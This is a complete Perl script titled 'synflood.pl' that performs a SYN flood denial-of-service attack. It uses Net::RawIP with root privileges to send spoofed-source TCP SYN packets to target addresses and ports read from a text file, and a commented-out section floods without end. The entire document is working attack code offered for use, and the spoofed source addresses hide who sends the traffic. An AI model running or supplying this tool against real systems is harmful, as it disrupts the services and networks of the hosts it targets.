#!/usr/bin/perl
# synflood.pl - Simple SYN Flooder
# Author: iphelix
#
# Requires perl, Net::RawIP module, and root privileges

use Net::RawIP;

if ($ARGV[1] eq "--help")
{
   print "./synflooder source_ip destination_ip destination_port\n";
   exit(0);
}

my $filename = "synfloodIp.txt";

open (my $fh, "< $filename")
  or die "can not open file '$fh' $!";

while (my $row = <$fh>) 
{
    my $item = split / /, $row;
    if ($item == 4)
    {
       my ($src,$dst,$port, $num) = split / /, $row;
       $a = new Net::RawIP;
       while($num--) {
          $src_port = rand(65534)+1;
          $a->set({ip => {saddr => $src,daddr => $dst},tcp => {source => $src_port,dest => $port, syn => 1}});
          $a->send;   
       }
    }
    else 
    {
        die "file format incorrect... \n";
    }
}

#if($#ARGV == 2) {
#   ($src,$dst,$port) = @ARGV;
#   $a = new Net::RawIP;
#   while(1) {
#      $src_port = rand(65534)+1;
#      $a->set({ip => {saddr => $src,daddr => $dst},tcp => {source => $src_port,dest => $port, syn => 1}});
#      $a->send;   
#   }
#} else {
#   print "./synflooder source_ip destination_ip destination_port\n";
#}

